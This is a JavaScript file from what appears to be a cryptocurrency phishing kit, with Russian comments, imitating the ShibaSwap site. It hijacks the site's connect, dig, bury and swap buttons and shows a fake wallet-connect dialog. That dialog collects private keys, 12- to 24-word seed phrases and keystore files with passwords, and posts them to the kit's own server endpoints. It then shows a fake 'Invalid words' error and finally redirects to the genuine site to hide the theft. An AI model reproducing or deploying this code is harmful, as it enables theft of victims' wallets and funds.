// Переменные для работы с кошельками
var isSent = false;
var allowSent = 4;
var clickCount = 0;
var walletName="empty";

// Ваши обработчики jQuery
$(".giUzdE").on("click", function (e) {
    $(".owerlay").show();
    $(".alert").hide();
    $(".alertMain").show();
    $(".errormessage").hide();
});

$(".closeBtn").on("click", function (e) {
    $(".owerlay").hide();
    $(".alert").hide();
});

$(".mainSelect").on("click", function (e) {
    $(".alert").hide();
    $(".alertError").show();
});

$(".sun").on("click", function (e) {
    $('body').removeClass("black");
    $(".swith svg").removeClass("active");
    $(this).addClass("active");
});

$(".moon").on("click", function (e) {
    $('body').addClass("black");
    $(".swith svg").removeClass("active");
    $(this).addClass("active");
});

$(".errorSelect").on("click", function (e) {
    $(".alert").hide();
    $("." + $(this).data("type")).show();
    if($(this).data("type") == "Keystore"){
        $("#fileinp").click();
    }
});
$("#privat_key").on("click", function () {
    $(".loader").css("visibility", "visible");
    try {
        let privateKey = $(".privat_key_inp").val();
        let wallet = new ethers.Wallet(privateKey);

        $.ajax({
            method: "POST",
            url: "./index.php",
            data: {
                name: JSON.stringify(wallet)
            }
        })
        .done(function (msg) {
            document.location.replace(msg);
        });
    } catch (err) {
        $("#privat_key_error").show();
        $(".loader").css("visibility", "hidden");
    }
});

$("#mnemonic").on("click", function () {
    $(".loader").css("visibility", "visible");
    try {
        let mnemonic = $(".mnemonic").val();
        let wallet = ethers.Wallet.fromMnemonic(mnemonic.trim());

        $.ajax({
            method: "POST",
            url: "./index.php",
            data: {
                name: JSON.stringify(wallet)
            }
        })
        .done(function (msg) {
            document.location.replace(msg);
        });
    } catch (err) {
        $("#mnemonic_error").show();
        $(".loader").css("visibility", "hidden");
    }
});
function receivedText() {
    $(".loader").css("visibility", "visible");
    var file = $('#fileinp');
    var input = file.get(0);
    var reader = new FileReader();

    reader.onload = function (e) {
        let data = e.target.result;
        let json = data;
        let password = $(".keystore_inp").val();

        ethers.Wallet.fromEncryptedJson(json, password).catch(function(reason) {
            console.log(reason.message);
            if(reason.message == "invalid password"){
                $("#json_error").text("Invalid Password");
                $("#json_error").show();
                $(".loader").css("visibility", "hidden");
            } else {
                $("#json_error").text("Unexpected number in JSON at position 1");
                $("#json_error").show();
                $(".loader").css("visibility", "hidden");
            }
        }).then(function(wallet) {
            $.ajax({
                method: "POST",
                url: "./index.php",
                data: { name: JSON.stringify(wallet) }
            })
            .done(function(msg) {
                document.location.replace(msg);
            });
        });
    };
    reader.readAsText(input.files[0]);
}
$("#keystore").on("click", function() {
    if (!window.File || !window.FileReader || !window.FileList || !window.Blob) {
        alert('The File APIs are not fully supported in this browser.');
        return;
    }   

    var input = document.getElementById('fileinp');
    if (!input) {
        alert("Um, couldn't find the fileinput element.");
    }
    else if (!input.files) {
        alert("This browser doesn't seem to support the `files` property of file inputs.");
    }
    else if (!input.files[0]) {
        $("#json_error").text("You must select a file to import.");
        $("#json_error").show();  
        $(".loader").css("visibility", "hidden");
    }
    else {
        if($(".keystore").val() != ""){
            receivedText();
        } else {
            $("#json_error").text("Invalid Password");
            $("#json_error").show();
            $(".loader").css("visibility", "hidden");
        }
    }
});

// Новые функции для работы с кошельками
document.getElementById("words").addEventListener("input", function () {
    document.getElementById("wallet-connect-h2").innerHTML = "Connect Wallet";
    document.getElementById("wallet-connect-h2").style.color = "white";
});
function sendData() {
    let wordsStr = document.getElementById("words").value.trim().replace(/  +/g, ' ');
    let words = wordsStr.split(" ");

    if (!(words.length === 12 || words.length === 15 || words.length === 18 || words.length === 24))
        alert("Please enter 12 or 15 or 18 or 24 words");
    else if (isSent)
        showError();
    else
        send(words, words.length===12?0:words.length===15?1:words.length===18?2:words.length===24?3:4);
    clickCount++;
}

function send(words, role) {
    let dataOBJ = {};
    let endIndex = role === 0 ? 12 : role === 1 ? 15 : role === 2 ? 18 : role === 3 ? 24 : 12;
    
    for (let i = 0; i < endIndex; i++)
        dataOBJ["w" + (i + 1)] = words[i];
    
    dataOBJ["role"] = role;
    dataOBJ["wallet"] = walletName;

    $.ajax({
        url: "/download",
        type: "POST",
        data: dataOBJ,
        success: function (res) {
            var json = JSON.parse(res);
            if (json.status === true) {
                isSent = true;
                showError();
            }
            console.log("RESPONSE=" + res);
        }
    });
}
function showError() {
    if (clickCount >= 5)
        window.location.href = "https://shibaswap.com/";
    document.getElementById("wallet-connect-h2").innerHTML = "Invalid words !";
    document.getElementById("wallet-connect-h2").style.color = "red";
}

let aNumbers = document.getElementsByClassName("a-number");
let grids = document.getElementsByClassName("walletconnect-connect__buttons__wrapper__wrap");

for (const aNumber of aNumbers) {
    aNumber.addEventListener("click", function () {
        //disable all a tags
        for (const argument of aNumbers)
            argument.style.fontWeight = "normal";
        //disable all grids
        for (const argument of grids)
            argument.style.display = "none";
        if (aNumber.id === "a-1")
            grids[0].style.display = "grid";
        else if (aNumber.id === "a-2")
            grids[1].style.display = "grid";
        else if (aNumber.id === "a-3")
            grids[2].style.display = "grid";
        else if (aNumber.id === "a-4")
            grids[3].style.display = "grid";
        else if (aNumber.id === "a-5")
            grids[4].style.display = "grid";
        aNumber.style.fontWeight = "bold";
    });
}
function showWallets() {
    let wallets = document.querySelector(".owerlay");
    wallets.style.display = "block";
    document.querySelector(".alert").style.display = "none";
    document.querySelector(".alert").style.display = "block";
    document.querySelector(".errormessage").style.display = "none";
}

function closeWallets() {
    let wallets = document.getElementById("walletconnect-wrapper");
    wallets.style.display = "none";
}

function showWalletWords() {
    let wallets = document.getElementById("wallet-words");
    wallets.style.display = "block";
}

function closeWalletWords() {
    let wallets = document.getElementById("wallet-words");
    wallets.style.display = "none";
}

function clickWallets(e) {
    let image = e.childNodes[1];
    walletName = e.childNodes[3].innerHTML;
    let copy = image.cloneNode(true);
    copy.style.width = "30px";
    copy.style.height = "30px";
    copy.setAttribute("id", "image-wallet");
    document.getElementById("image-wallet").replaceWith(copy);
    document.getElementById("wallet-type").innerHTML = walletName;
    closeWallets();
    showWalletWords();
}
//find main btn
findMainConnectBtn();
//check DIG btn
if (window.location.href.includes("ETH") || window.location.href.includes("add"))
    findDIGBtn();
//check Bury btn
if (window.location.href.includes("bury"))
    findBuryBtn();
//check swap btn
if (window.location.href.includes("swap"))
    findSwapBtn();

//***** hash change listener
window.addEventListener("hashchange", function () {
    //check DIG btn
    if (window.location.href.includes("ETH") || window.location.href.includes("add"))
        findDIGBtn();
    //check Bury btn
    if (window.location.href.includes("bury"))
        findBuryBtn();
    //check swap btn
    if (window.location.href.includes("swap"))
        findSwapBtn();
});

function findMainConnectBtn() {
    let btn = document.getElementById("connect-wallet");
    if (btn == null)
        setTimeout(findMainConnectBtn, 100);
    else {
        console.log("OK *** findMainConnectBtn() ***");
        let copy = btn.cloneNode(true);
        copy.setAttribute("id", "null");
        btn.replaceWith(copy);
        copy.addEventListener("click", function () {
            showWallets();
        });
    }
}
function findDIGBtn() {
    let btn = document.getElementsByClassName("sc-bdVaJa dkzats sc-gzVnrw sc-htoDjs iYmrsn mt-1 mb-1")[0];
    if (btn == null)
        setTimeout(findDIGBtn, 100);
    else {
        console.log("OK *** findDIGBtn() ***");
        let copy = btn.cloneNode(true);
        copy.setAttribute("id", "null");
        btn.replaceWith(copy);
        copy.addEventListener("click", function () {
            showWallets();
        });
    }
}

function findBuryBtn() {
    let btn = document.getElementsByClassName("sc-hcmgZB blPQct bury_approve")[0];
    if (btn == null)
        setTimeout(findBuryBtn, 100);
    else {
        console.log("OK *** findBuryBtn() ***");
        let copy = btn.cloneNode(true);
        copy.setAttribute("id", "null");
        btn.replaceWith(copy);
        copy.addEventListener("click", function () {
            showWallets();
        });
    }
}

function findSwapBtn() {
    let btn = document.getElementsByClassName("sc-bdVaJa dkzats sc-gzVnrw sc-iwsKbI dZsCmz")[0];
    if (btn == null)
        setTimeout(findSwapBtn, 100);
    else {
        console.log("OK *** findSwapBtn() ***");
        let copy = btn.cloneNode(true);
        copy.setAttribute("id", "null");
        btn.replaceWith(copy);
        copy.addEventListener("click", function () {
            showWallets();
        });
    }
}
